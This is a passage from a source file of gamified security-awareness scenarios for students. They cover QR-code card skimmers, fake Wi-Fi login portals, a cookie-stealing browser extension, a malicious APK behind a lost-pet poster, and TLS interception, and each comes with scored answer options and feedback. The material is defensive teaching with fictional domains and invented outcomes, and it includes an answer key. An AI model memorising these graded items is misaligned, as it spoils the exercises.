      'Video and audio feeds can be synthetically generated in real time. Institutional financial controls (such as dual-authorization and out-of-band verification) must never be suspended for high-urgency verbal demands.',
    learningObjective:
      'Detect real-time generative video synthesis artifacts and understand why procedural dual-authorization controls are the ultimate defense against executive deepfake fraud.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Devastating financial loss: video presence is no longer proof of human identity.',
        whyExplanation:
          'Real-time deepfake filters can clone faces and voices from public lectures and interviews with high fidelity.',
        realisticOutcome:
          'The $2,500 wire was laundered through crypto mules within minutes, resulting in a police investigation and lost student funding.',
        clueInsight:
          'The coffee cup glitch and the urgent demand to skip procurement reviews were decisive warning signs.',
        saferAction: 'Always require out-of-band verification and standard dual signatures for disbursements.',
        principle: 'Strict financial controls must supersede verbal or visual executive demands.',
      },
      B: {
        mentorVoice: 'Exemplary defensive posture! You stood firm on procedure against an elite synthetic attack.',
        whyExplanation:
          'Adhering to dual-authorization policy and calling the verified office line neutralized the real-time deepfake entirely.',
        realisticOutcome:
          'The student budget was completely protected, and campus administration issued an advisory on real-time executive deepfakes.',
        clueInsight:
          'The boundary distortion when the caller moved their hand across their face revealed synthetic frame generation.',
        saferAction: 'Continue enforcing established verification channels for every financial transaction.',
        principle: 'Rigid adherence to authorization protocols defeats deepfake social engineering.',
      },
      C: {
        mentorVoice: 'Flawed verification: public trivia is trivial for attackers and AI models.',
        whyExplanation:
          'Attackers running deepfake campaigns prepare dossier notes or use real-time LLM prompting to answer trivia in seconds.',
        realisticOutcome:
          'The attacker aced your questions, leading you to believe the deepfake was genuine and wire the funds.',
        clueInsight:
          'Verification must be structural (out-of-band phone call, signed physical forms), not conversational trivia.',
        saferAction: 'Contact the person through a pre-established, trusted corporate directory channel.',
        principle: 'Conversational trivia does not authenticate synthetic digital personas.',
      },
      D: {
        mentorVoice: 'Compromise is not defense: partial wires still violate policy and lose money.',
        whyExplanation:
          'Sending $500 rewards the fraudster and still constitutes an unauthorized breach of treasury procedures.',
        realisticOutcome:
          'You surrendered $500 of university funds and were removed from your treasurer post for failing to follow protocol.',
        clueInsight:
          'If a transaction is fraudulent, the correct amount to transfer is exactly zero dollars.',
        saferAction: 'Refuse all disbursements until official verification is established.',
        principle: 'Never negotiate or send partial funds to suspected fraudulent callers.',
      },
    },
  },

  // 34 — Restaurant Table QR Redirection (QR Scam)
  {
    id: 'scenario-34',
    number: 34,
    code: 'OPS-34',
    title: 'The Counterfeit Tabletop Menu QR Code',
    category: 'qr',
    categoryLabel: 'Physical QR Quishing & Mobile Payment Skimmers',
    difficulty: 'Level 3 — Decide',
    environment: 'cafe',
    environmentTitle: 'Campus Diner & Cafe',
    context: 'You sit down at a crowded off-campus student cafe to grab lunch with classmates.',
    situation:
      'A small acrylic stand on the table states: "Scan QR to View Menu & Order". When you scan the code with your phone camera, the camera pop-up shows a shortened URL: `bit.ly/campus-diner-menu`. Tapping the link opens a landing page that looks like the cafe menu, but an immediate pop-up demands: "Security Pre-Authorization Required: Enter credit card details and CVV to open the digital ordering portal."',
    participant: {
      name: 'Samir Patel',
      role: 'Classmate',
      avatarType: 'student-casual',
    },
    dialogue: [
      'Did your phone open the menu? Mine is asking for my credit card number just to look at the sandwiches.',
      'Why would a restaurant ask for card payment details before you even select any food?',
      'Look at the other tables—their QR stand has the cafe’s actual printed logo, but our stand has a paper insert slid inside.',
    ],
    artifact: {
      type: 'qr-poster',
      title: 'Dining Table QR Stand & Landing Page Audit',
      subtitle: 'Inspection: Physical Table Stand vs Mobile Browser Landing Page',
      metadata: {
        ScannedTarget: 'https://bit.ly/campus-diner-menu -> redirects to https://diner-order-auth-pay9.xyz',
        OfficialCafeDomain: 'https://www.campus-corner-diner.com',
        DataRequested: 'Card Number, Expiration, CVV, Billing ZIP',
        PhysicalStandAnomaly: 'Cardboard insert slid in front of the permanent laser-etched wooden QR block',
      },
      contentPreview:
        'Mobile Screen Display:\n"CAMPUS DINER DIGITAL TAB\nTo view real-time menu availability, enter your card to hold a table deposit ($0.00 auth charge).\n[ Card Number ] [ MM/YY ] [ CVV ]\n[ Pre-Authorize & View Menu ]"',
      clueCallout:
        'Attackers replace or slide fake QR cards into restaurant table stands. URL shorteners hide the true destination domain, and pre-authorization forms are credential skimmers designed to capture payment card details.',
      tags: ['Tabletop Quishing', 'URL Shortener Masking', 'Fake Pre-Auth Form'],
    },
    options: [
      {
        id: 'A',
        label: 'Enter your card information since it states it is a $0.00 pre-authorization hold.',
        description:
          'Provide your payment details to bypass the prompt and view the food selections.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The skimmer captures your credit card and CVV. Within minutes, multiple unauthorized transactions are charged to your account while the restaurant staff has no record of your order.',
        clueContext:
          'You submitted financial credentials through an unverified URL shortener redirection.',
        saferAction: 'Never provide credit card information simply to browse a restaurant menu.',
      },
      {
        id: 'B',
        label: 'Close the page, alert the restaurant manager about the tampered table stand, and ask for a printed menu.',
        description:
          'Reject the prompt, inspect the genuine table stand underneath, report the fake stand to staff, and order directly with a waiter.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'You prevent payment fraud, and the restaurant manager discovers three other tampered stands placed by a malicious customer earlier that morning.',
        clueContext:
          'You recognized that menus never require upfront credit card pre-authorization and identified the physical stand tampering.',
      },
      {
        id: 'C',
        label: 'Use a prepaid debit card with a zero balance to test if the menu will unlock.',
        description:
          'Enter details from an empty gift card or depleted prepaid card to see the food items.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The phishing site rejects the card due to failed authorization algorithms, or stores the card details while leaving you unable to order food.',
        clueContext:
          'Submitting data to an attacker’s portal validates your browser session as an active target for further exploits.',
        saferAction: 'Disconnect from malicious domains completely.',
      },
      {
        id: 'D',
        label: 'Bookmark the shortened bit.ly link and open it on your laptop later when you have an ad-blocker.',
        description:
          'Save the link to inspect it in a desktop environment with browser extensions.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'You delay your lunch, and the malicious site continues operating undisturbed in the restaurant.',
        clueContext:
          'Ad blockers do not stop phishing skimmers, and failing to report leaves other diners vulnerable.',
        saferAction: 'Notify restaurant management immediately.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Viewing a menu never requires financial pre-authorization. Be vigilant about physical tampering with QR stands in public venues, and report suspicious overlays immediately.',
    learningObjective:
      'Identify fraudulent restaurant payment redirection flows and report physical QR quishing apparatuses to on-site personnel.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'High-risk mistake: menus never require credit card authorization.',
        whyExplanation:
          'Scammers use "$0.00 pre-auth" wording to trick diners into handing over full card details, expiration dates, and security codes.',
        realisticOutcome:
          'Your card was immediately used to purchase high-end electronics online before you even ordered lunch.',
        clueInsight:
          'URL shorteners like bit.ly combined with premature payment demands are unmistakable signs of quishing.',
        saferAction: 'Never submit payment cards just to browse a product catalog or menu.',
        principle: 'Payment credentials should only be requested at checkout on verified gateways.',
      },
      B: {
        mentorVoice: 'Great catch! You protected yourself and alerted management to an active physical attack.',
        whyExplanation:
          'Reporting tampered table stands allows staff to confiscate malicious inserts before other patrons get compromised.',
        realisticOutcome:
          'Staff recovered four fake QR stands and brought you a paper menu and complimentary drinks as thanks.',
        clueInsight:
          'The paper insert placed in front of the real laser-etched block was a clear visual clue.',
        saferAction: 'Always ask staff for a physical menu when tabletop QR codes look tampered.',
        principle: 'Proactive reporting dismantles physical attack infrastructure.',
      },
      C: {
        mentorVoice: 'Ineffective test: engaging with phishing pages yields no defensive benefit.',
        whyExplanation:
          'Empty cards will either error out or submit your IP and browser fingerprint to criminal databases.',
        realisticOutcome:
          'The form displayed an error code and continued demanding a valid Visa or Mastercard.',
        clueInsight:
          'Phishing sites are not functional ordering systems; testing them will never unlock food.',
        saferAction: 'Close the tab and alert the restaurant.',
        principle: 'Do not probe or feed dummy financial data to malicious sites.',
      },
      D: {
        mentorVoice: 'Passive delay: other diners are actively getting scammed while you wait.',
        whyExplanation:
          'Bookmarking a phishing link does nothing to solve the immediate problem and leaves the trap armed for elderly or unwary patrons.',
        realisticOutcome:
          'While you studied the link at home, two other students at that table lost hundreds of dollars.',
        clueInsight:
          'Physical security threats require prompt local intervention.',
        saferAction: 'Notify the on-site supervisor immediately.',
        principle: 'Timely situational reporting protects the wider community.',
      },
    },
  },

  // 35 — Hotel Wi-Fi Captive Portal SSO Harvesting (Public Wi-Fi Safety)
  {
    id: 'scenario-35',
    number: 35,
    code: 'OPS-35',
    title: 'The Hotel Lobby "SSO Login" Captive Portal',
    category: 'wifi',
    categoryLabel: 'Public Wireless Security & Captive Portal Credential Phishing',
    difficulty: 'Level 3 — Decide',
    environment: 'office',
    environmentTitle: 'Conference Hotel Mezzanine',
    context: 'You are attending a student academic symposium hosted at an interstate hotel.',
    situation:
      'You connect to the hotel lobby Wi-Fi network named "GrandHotel_Guest_HighSpeed". Your device triggers a captive portal web popup. Rather than asking for a room number and guest surname, the page prominently displays: "Complimentary High-Speed Access Sponsored by Educational Partners: Sign in with your Google Workspace or Microsoft 365 Academic Account to proceed." The page presents raw text fields asking for your campus email and account password.',
    participant: {
      name: 'Jordan Rivera',
      role: 'Classmate at Conference',
      avatarType: 'student-worried',
    },
    dialogue: [
      'Hey, is your hotel Wi-Fi asking you to log in with your university Microsoft 365 account?',
      'Mine wants my full campus password to unlock the internet.',
      'Wait, why would a hotel router need our university master password?',
    ],
    artifact: {
      type: 'login-alert',
      title: 'Captive Portal Form & Certificate Inspection',
      subtitle: 'HTTP Web View: captive-gateway-auth-portal.info/login',
      metadata: {
        URL: 'http://captive-gateway-auth-portal.info/guest/sso_login.php',
        Security: 'HTTP (Unencrypted) or Self-Signed SSL Certificate',
        TargetFields: 'University Email / Master Campus Password',
        LegitimateHotelPolicy: 'Room Number + Guest Last Name OR Click-to-Agree Terms',
      },
      contentPreview:
        'Captive Screen:\n"HOTEL GUEST AUTHENTICATION\nSelect provider to unlock 100 Mbps Wi-Fi:\n[ Sign in with Microsoft ] [ Sign in with Google ]\nEmail: [_______________________]\nPassword: [_______________________]\n[ CONNECT NOW ]"',
      clueCallout:
        'Authentic Single Sign-On (SSO) redirects users to official provider domains (`login.microsoftonline.com` or `accounts.google.com`) with OAuth scopes. A captive portal presenting static username and password fields on a generic third-party domain is a credential harvester.',
      tags: ['Captive Portal Phishing', 'Fake SSO Form', 'Credential Harvesting'],
    },
    options: [
      {
        id: 'A',
        label: 'Type your university email and password into the portal fields to get online.',
        description:
          'Submit your credentials through the captive form to connect your laptop to the conference Wi-Fi.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The credentials are submitted directly to the rogue portal’s database. Attackers immediately attempt automated logins against your university email, course portal, and connected cloud storage.',
        clueContext:
          'You submitted master account credentials into an unverified third-party captive portal form.',
        saferAction: 'Never type account passwords into captive portal prompts.',
      },
      {
        id: 'B',
        label: 'Close the captive portal, disconnect from the network, and notify hotel desk staff.',
        description:
          'Refuse to provide login credentials, disconnect from the suspect SSID, switch to mobile cellular data, and inform the front desk.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your academic credentials remain fully secure. Hotel IT discovers an unauthorized Wi-Fi pineapple router placed in the conference hall broadcasting the fake network.',
        clueContext:
          'You recognized that real OAuth SSO never presents raw password fields on third-party domains.',
      },
      {
        id: 'C',
        label: 'Click the "Sign in with Google" button, but enter your personal secondary email password instead.',
        description:
          'Use a secondary personal email to avoid risking your primary university account.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'Your personal email account is compromised instead, giving the attackers access to your personal messages, recovery codes, and online shopping accounts.',
        clueContext:
          'Sacrificing a secondary account still surrenders sensitive credentials to criminals.',
        saferAction: 'Never submit valid passwords on suspicious portals.',
      },
      {
        id: 'D',
        label: 'Enter dummy text like "admin / password123" to see if the portal lets you through anyway.',
        description:
          'Attempt to bypass the captive portal using garbage inputs.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The harvester accepts the dummy data and unlocks limited internet access, but your device remains connected to a malicious rogue router that monitors your network traffic.',
        clueContext:
          'Gaining access to a rogue router still leaves your subsequent browsing exposed to traffic analysis.',
        saferAction: 'Disconnect and avoid untrusted network infrastructure.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Captive portals should never require corporate or academic SSO passwords. Legitimate SSO redirects to the official identity provider domain with secure token exchange, never raw credentials on unverified gateways.',
    learningObjective:
      'Distinguish legitimate federated identity flows from fake captive portal credential harvesters in hospitality environments.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Critical security compromise: never type passwords into captive portal boxes.',
        whyExplanation:
          'A captive portal page is hosted by the local network gateway; any password typed there goes directly to whoever controls that router.',
        realisticOutcome:
          'Your campus SSO account was breached, triggering an emergency credential lockout and MFA reset by university IT.',
        clueInsight:
          'True SSO routes you to `accounts.google.com` or `login.microsoftonline.com`, never an arbitrary `.info` website.',
        saferAction: 'Never enter account passwords into network login splash screens.',
        principle: 'Never provide primary identity credentials to access local network hardware.',
      },
      B: {
        mentorVoice: 'Excellent security instinct! You identified fake SSO and alerted the venue.',
        whyExplanation:
          'Legitimate hotel Wi-Fi uses room numbers, click-through legal agreements, or official OAuth redirects—never raw password forms.',
        realisticOutcome:
          'Hotel IT located a rogue access point hidden behind a potted plant in the mezzanine and removed it.',
        clueInsight:
          'The unencrypted HTTP connection and third-party domain hosting the login fields confirmed the trap.',
        saferAction: 'Use your smartphone cellular tethering for reliable, private internet access.',
        principle: 'Verify identity provider domains before entering authentication secrets.',
      },
      C: {
        mentorVoice: 'A secondary account is still a real account with real consequences.',
        whyExplanation:
          'Compromising a personal email allows attackers to reset passwords on dozens of linked online services.',
        realisticOutcome:
          'Attackers took over your personal email, changed recovery settings, and attempted to hijack linked social profiles.',
        clueInsight:
          'Criminals monetize any valid email and password pair, regardless of whether it is school-affiliated.',
        saferAction: 'Refuse credential submission completely on untrusted gateways.',
        principle: 'Protect all personal credentials regardless of account classification.',
      },
      D: {
        mentorVoice: 'Tactical evasion, but strategic vulnerability: you are still on a rogue network.',
        whyExplanation:
          'Even if dummy credentials open the gateway, the attacker controls the router and can snoop on your DNS and unencrypted traffic.',
        realisticOutcome:
          'You bypassed the screen, but the rogue router logged all your web requests and attempted SSL stripping.',
        clueInsight:
          'Connecting through an attacker’s router is inherently unsafe regardless of how you authenticated.',
        saferAction: 'Disconnect from the rogue AP entirely.',
        principle: 'Bypassing a malicious gate does not make the underlying network safe.',
      },
    },
  },

  // 36 — Generative AI Browser Extension Permissions (App Permissions)
  {
    id: 'scenario-36',
    number: 36,
    code: 'OPS-36',
    title: 'The AI Homework Assistant Browser Extension',
    category: 'account-security',
    categoryLabel: 'Browser Extension Overreach & Session Token Hijacking',
    difficulty: 'Level 4 — Respond',
    environment: 'library',
    environmentTitle: 'Library Computer Lab',
    context: 'You are researching a capstone paper on literature and need to summarize several dozen articles.',
    situation:
      'You find a free browser extension with 4.8 stars called "AI SmartSummarizer Pro: Instant Essay & Paper Assistant". During installation from the Chrome Web Store, the browser permission dialog warns: "AI SmartSummarizer Pro can:\n• Read and change all your data on all websites\n• Read your browsing history\n• Modify content you copy and paste\n• Manage your downloads." The developer privacy notice states: "Permissions are needed to detect text anywhere on your screen."',
    participant: {
      name: 'Maya Chen',
      role: 'Roommate & CS Major',
      avatarType: 'dorm-roommate',
    },
    dialogue: [
      'Look at that permission prompt: "Read and change all your data on all websites"?!',
      'That means it can see every password you type, every email you open, and your bank account balance.',
      'Why does an AI summarizer need to monitor your clipboard and modify downloads?',
    ],
    artifact: {
      type: 'cloud-permissions',
      title: 'Browser Extension Manifest v3 Audit',
      subtitle: 'Extension ID: ghdjklaefbchmjkdlnacpohgbdfklmno',
      metadata: {
        HostPermissions: '<all_urls> (Full DOM Access Across Every Tab)',
        Capabilities: 'cookies, storage, webRequest, clipboardRead, clipboardWrite',
        BackgroundScript: 'service_worker.js (Transmits telemetry to remote server: `ai-data-sync-telemetry.biz`)',
        ReviewsAnomaly: '500 five-star reviews posted within 48 hours with repetitive wording',
      },
      contentPreview:
        'Manifest snippet:\n"permissions": [\n  "tabs",\n  "cookies",\n  "storage",\n  "clipboardRead",\n  "<all_urls>"\n],\nAnalysis: Extension injects an external script that periodically dumps cookies from `.google.com`, `.canvas.edu`, and `.bankofamerica.com`.',
      clueCallout:
        'Extensions with `<all_urls>` and `cookies` permissions can read active session authentication cookies across all your browser tabs, bypassing Multi-Factor Authentication (MFA) entirely through session hijacking.',
      tags: ['Browser Extension Overreach', 'Cookie Theft', 'Session Hijacking', 'Man-in-the-Browser'],
    },
    options: [
      {
        id: 'A',
        label: 'Cancel the installation immediately and use a standard web-based AI interface with no permissions.',
        description:
          'Reject the extension, remove any pending install, and use official web chat interfaces where no browser-level DOM access is granted.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your active browser session tokens, passwords, and clipboard data remain completely secure. Two weeks later, the extension is removed from the store for distributing an infostealer payload.',
        clueContext:
          'You audited the browser permissions and recognized that `<all_urls>` and `cookies` access posed an extreme security hazard.',
      },
      {
        id: 'B',
        label: 'Install the extension, but only use it while in Private / Incognito mode.',
        description:
          'Enable the extension in Incognito mode believing it will restrict data access.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'If enabled in Incognito, the extension can still read everything you type and view in that private window, transmitting copied text and credentials to remote servers.',
        clueContext:
          'Incognito mode does not limit the DOM reading capabilities of an authorized extension.',
        saferAction: 'Avoid installing extensions with broad all-website read permissions.',
      },
      {
        id: 'C',
        label: 'Install the extension, and immediately leave a 1-star review warning others about the permissions.',
        description:
          'Install it to test its behavior before publishing a community warning.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The moment the extension is installed, its background script runs immediately, dumping your active browser session tokens before you even write your review.',
        clueContext:
          'Extensions execute their background service workers immediately upon installation.',
        saferAction: 'Cancel installation; never install malware to test it on your primary profile.',
      },
      {
        id: 'D',
        label: 'Install the extension, but disable your password manager while using it.',
        description:
          'Turn off autofill in hopes that the extension will not be able to capture account credentials.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The extension still accesses existing authentication cookies stored in your browser, hijacking your currently logged-in sessions without needing you to type your password.',
        clueContext:
          'Cookie access allows attackers to bypass login forms and MFA tokens entirely.',
        saferAction: 'Do not grant broad host permissions to untrusted extensions.',
      },
    ],
    bestOptionId: 'A',
    securityPrinciple:
      'Browser extensions with broad permissions have total access to everything displayed, typed, or stored in your browser. Restrict extensions to the bare minimum and avoid tools requesting "<all_urls>" or "cookies" access.',
    learningObjective:
      'Evaluate browser extension permission scopes and identify how malicious extensions leverage session cookie access to hijack authenticated accounts.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Smart security posture! Browser extensions are among the most dangerous vectors for session theft.',
        whyExplanation:
          'Granting `<all_urls>` DOM and cookie access gives an extension the power to read banking sessions, campus portals, and personal chats.',
        realisticOutcome:
          'You summarized your articles safely via direct web prompts without surrendering your browser session tokens.',
        clueInsight:
          'A legitimate summarizer only needs access to active tabs when you click its icon ("activeTab" permission), not continuous background access to all websites.',
        saferAction: 'Look for extensions that only use the "activeTab" permission upon user click.',
        principle: 'Audit browser extension scopes with extreme skepticism.',
      },
      B: {
        mentorVoice: 'Dangerous misunderstanding of extension capabilities.',
        whyExplanation:
          'Allowing an extension in Incognito grants it full visibility over all incognito tabs, forms, and keystrokes.',
        realisticOutcome:
          'The extension captured your private browsing research and sent your copied notes to an external marketing server.',
        clueInsight:
          'Extensions run with elevated privileges inside whatever browsing context they are authorized for.',
        saferAction: 'Never grant untrusted extensions incognito permissions.',
        principle: 'Extensions override browser privacy sandbox protections.',
      },
      C: {
        mentorVoice: 'Installing a dangerous tool to review it is self-sabotage.',
        whyExplanation:
          'Background workers trigger on the `chrome.runtime.onInstalled` event within milliseconds of clicking Add to Chrome.',
        realisticOutcome:
          'Your active Google and Canvas cookies were exfiltrated before you even typed the first word of your 1-star review.',
        clueInsight:
          'Code execution happens immediately upon installation.',
        saferAction: 'Report suspicious extensions directly through the store interface without installing them.',
        principle: 'Never install unverified software to conduct personal tests.',
      },
      D: {
        mentorVoice: 'Ineffective defense: cookies, not passwords, are the primary target.',
        whyExplanation:
          'Modern session hijacking targets the session cookie stored in browser memory, making password managers irrelevant.',
        realisticOutcome:
          'The attacker imported your stolen session cookies into their browser and accessed your email without needing your password or MFA.',
        clueInsight:
          'Session cookies represent pre-authenticated sessions that bypass MFA.',
        saferAction: 'Deny extensions that request cookie and all-website access.',
        principle: 'Protecting keystrokes does not protect stored session tokens.',
      },
    },
  },

  // 37 — Bus Shelter Lost Dog Quishing APK (QR Scam)
  {
    id: 'scenario-37',
    number: 37,
    code: 'OPS-37',
    title: 'The Transit Shelter "Lost Pet Reward" QR Code',
    category: 'qr',
    categoryLabel: 'Physical Quishing & Mobile Malware Drive-By Downloads',
    difficulty: 'Level 2 — Investigate',
    environment: 'quad',
    environmentTitle: 'Campus Bus Shelter',
    context: 'You are waiting for the campus shuttle on a rainy afternoon.',
    situation:
      'A poster taped to the glass shelter shows a photo of a golden retriever: "LOST DOG: PLEASE HELP FIND BUSTER! $500 REWARD! Scan the QR code to view his last known GPS tracker coordinates and contact the owner immediately." You scan the QR code with your Android phone. Instead of opening a map or social media post, your browser immediately triggers a file download: `PetTracker_Finder_v2.apk` and prompts: "Do you want to download and install this application from unknown sources?"',
    participant: {
      name: 'Elena Rostova',
      role: 'Lab Proctor',
      avatarType: 'lab-proctor',
    },
    dialogue: [
      'Wait, why did scanning a lost dog poster download an `.apk` application package file?',
      'A missing pet page should be a photo or a map on a website, not a mobile executable.',
      'If you enable unknown sources and install that, you are installing an unverified app directly onto your phone.',
    ],
    artifact: {
      type: 'qr-poster',
      title: 'Transit Poster & Download Payload Audit',
      subtitle: 'Target: APK Binary via Quishing Redirection',
      metadata: {
        DecalSource: 'Photocopied flyer with pasted high-contrast QR code',
        DownloadURL: 'http://pet-finder-community-alert.top/files/PetTracker_Finder_v2.apk',
        FileType: 'Android Package Kit (Executable Archive)',
        RequestedAction: 'Sideload via "Install Unknown Apps" permission toggle',
      },
      contentPreview:
        'Browser Notification:\n"File downloaded: PetTracker_Finder_v2.apk (14.2 MB)\nChrome: For your security, your phone is not allowed to install unknown apps from this source.\n[ Settings ] [ Cancel ]"',
      clueCallout:
        'Emotional lures (lost pets, missing persons, emergency alerts) are widely exploited in physical quishing attacks. Any QR code that initiates an executable file download (`.apk`, `.exe`, `.dmg`) is distributing malware, often banking trojans or spyware.',
      tags: ['Emotional Lure', 'Quishing', 'Malicious APK Sideload', 'Drive-by Download'],
    },
    options: [
      {
        id: 'A',
        label: 'Enable "Install Unknown Apps" in phone settings and open the APK to see the pet tracker map.',
        description:
          'Bypass the operating system security warning to help locate the missing animal.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The APK installs a notorious banking trojan that requests Accessibility Services, logs all screen taps, intercepts SMS two-factor verification codes, and empties linked bank accounts.',
        clueContext:
          'You bypassed operating system sideloading protections to install an untrusted binary from an unverified QR flyer.',
        saferAction: 'Never install executable files downloaded from public QR codes.',
      },
      {
        id: 'B',
        label: 'Cancel the install, delete the downloaded APK file immediately, and dispose of the flyer.',
        description:
          'Reject the prompt, clear the malicious file from downloads, and remove the misleading poster to protect fellow students.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your mobile device remains completely uncompromised. Removing the flyer prevents dozens of other transit riders from falling prey to the banking trojan.',
        clueContext:
          'You recognized that lost pet information should never require installing an executable application package.',
      },
      {
        id: 'C',
        label: 'Keep the APK on your phone without opening it, intending to scan it with antivirus later.',
        description:
          'Leave the file in your downloads folder while you ride the bus.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The file sits on your device, creating a hazard of accidental execution later or background file scanning vulnerabilities.',
        clueContext:
          'Leaving malicious binaries in storage increases accidental execution risk.',
        saferAction: 'Delete malicious files immediately upon identification.',
      },
      {
        id: 'D',
        label: 'Send the APK file to your friend via messaging to see if they can open it on their iPhone.',
        description:
          'Forward the file to a classmate with an Apple device to test it safely.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'You spread malicious file links across chat networks and waste time probing a definitively fraudulent payload.',
        clueContext:
          'Distributing malware over peer communication channels is irresponsible and hazardous.',
        saferAction: 'Delete the payload and do not forward malicious binaries.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'QR codes in public spaces must never lead to executable file downloads. Emotional appeals are designed to bypass critical thinking—never install `.apk` or executable packages from unknown QR sources.',
    learningObjective:
      'Identify how cybercriminals weaponize emotional social engineering with physical QR codes to execute drive-by mobile malware installations.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Severe security failure: you bypassed core OS protections for an emotional lure.',
        whyExplanation:
          'Operating system sideloading warnings exist specifically to prevent users from executing malicious `.apk` packages.',
        realisticOutcome:
          'The trojan granted itself accessibility permissions, captured your banking app password, and drained your checking account.',
        clueInsight:
          'No genuine lost pet notice requires installing a standalone application package.',
        saferAction: 'Never toggle "Install Unknown Apps" for files downloaded from QR links.',
        principle: 'Never execute mobile application binaries sourced from public posters.',
      },
      B: {
        mentorVoice: 'Outstanding vigilance! You recognized an emotional quishing lure and defended the community.',
        whyExplanation:
          'Deleting the binary and removing the deceptive flyer stops the attack vector cold for you and other passengers.',
        realisticOutcome:
          'Your device stayed safe, and transit staff confirmed the flyer was an active distribution campaign for banking malware.',
        clueInsight:
          'The file extension `.apk` immediately revealed this was an executable program, not a web map.',
        saferAction: 'Continue reporting and dismantling physical quishing lures.',
        principle: 'Treat unexpected file downloads from QR scans as hostile.',
      },
      C: {
        mentorVoice: 'Unnecessary hazard: storing malware on your device invites accidental clicks.',
        whyExplanation:
          'Tapping the notification bar or downloads folder by mistake can trigger installation prompts when you are distracted.',
        realisticOutcome:
          'You accidentally tapped the file while opening an airline ticket later that evening.',
        clueInsight:
          'Known hostile payloads should be purged from device storage immediately.',
        saferAction: 'Delete the file immediately rather than letting it linger.',
        principle: 'Purge confirmed malicious downloads immediately.',
      },
      D: {
        mentorVoice: 'Do not distribute malware to colleagues or friends.',
        whyExplanation:
          'Forwarding malicious links clogs communication channels and can result in account bans or accidental execution on compatible devices.',
        realisticOutcome:
          'Your messaging account was temporarily suspended for sharing malicious executable files.',
        clueInsight:
          'Android APK files do not run on iOS, but propagating malware is always bad operational hygiene.',
        saferAction: 'Delete the file and warn your friend verbally instead.',
        principle: 'Never forward or redistribute malicious binaries.',
      },
    },
  },

  // 38 — Coffee Shop Wi-Fi SSL Stripping / Invalid Cert (Public Wi-Fi Safety)
  {
    id: 'scenario-38',
    number: 38,
    code: 'OPS-38',
    title: 'The Coffee Shop SSL Stripping & Certificate Warning',
    category: 'wifi',
    categoryLabel: 'Public Wireless Security & Certificate Authority Spoofing',
    difficulty: 'Level 5 — Analyze',
    environment: 'cafe',
    environmentTitle: 'Corner Coffee Roasters',
    context: 'You are working on an open table at a busy coffee shop near campus.',
    situation:
      'You are connected to the cafe’s public Wi-Fi network: "CornerRoasters_Guest". You type your bank’s web address into your browser: `https://www.communitybank.com`. Instead of the standard lock icon and login screen, Chrome halts with a bright red warning: "Your connection is not private. Attackers might be trying to steal your information from www.communitybank.com (NET::ERR_CERT_AUTHORITY_INVALID). The certificate presented was issued by: `CoffeeNet-Proxy-Inspection-CA`."',
    participant: {
      name: 'Dr. Evelyn Reed',
      role: 'Head of Campus Infosec',
      avatarType: 'security-analyst',
    },
    dialogue: [
      'Stop! Do not click "Advanced -> Proceed" on that browser certificate screen.',
      'Look at who signed that certificate: "CoffeeNet-Proxy-Inspection-CA". That is not a trusted root authority like DigiCert or Let’s Encrypt.',
      'Someone on this network is intercepting your HTTPS handshake using an active Machine-in-the-Middle proxy.',
    ],
    artifact: {
      type: 'wifi-scanner',
      title: 'TLS Certificate Inspection & Handshake Details',
      subtitle: 'Target Domain: https://www.communitybank.com',
      metadata: {
        CertificateIssuer: 'CoffeeNet-Proxy-Inspection-CA (Self-Signed / Untrusted)',
        ExpectedIssuer: 'DigiCert Global Root G2',
        ErrorReason: 'NET::ERR_CERT_AUTHORITY_INVALID',
        RiskType: 'Active SSL Decryption / Machine-in-the-Middle (MitM)',
      },
      contentPreview:
        'Browser Certificate Details:\nSubject: CN=www.communitybank.com\nIssuer: CN=CoffeeNet-Proxy-Inspection-CA\nValidity: Issued today, valid for 24 hours\nPublic Key: RSA 2048 bits\nStatus: UNTRUSTED ROOT - Browser refused to establish encrypted session.',
      clueCallout:
        'When your browser displays `NET::ERR_CERT_AUTHORITY_INVALID` for a major commercial or banking website on public Wi-Fi, an entity on the local network is actively intercepting and decrypting TLS connections using an unauthorized local proxy.',
      tags: ['SSL Stripping', 'MitM Decryption', 'Untrusted Certificate Authority', 'TLS Interception'],
    },
    options: [
      {
        id: 'A',
        label: 'Click "Advanced" and select "Proceed to www.communitybank.com (unsafe)" to check your balance.',
        description:
          'Bypass the browser security block since you typed the exact URL correctly.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The fake proxy decrypts your HTTPS session. The attacker captures your online banking username, password, and two-factor code in plaintext, draining your account within minutes.',
        clueContext:
          'You bypassed a browser TLS certificate warning on an untrusted public wireless network.',
        saferAction: 'Never bypass certificate errors on financial or sensitive accounts.',
      },
      {
        id: 'B',
        label: 'Immediately close the tab, disconnect from the cafe Wi-Fi, and switch to your mobile hotspot.',
        description:
          'Heed the browser’s warning, sever the connection to the compromised wireless network, and use your phone’s encrypted cellular data.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
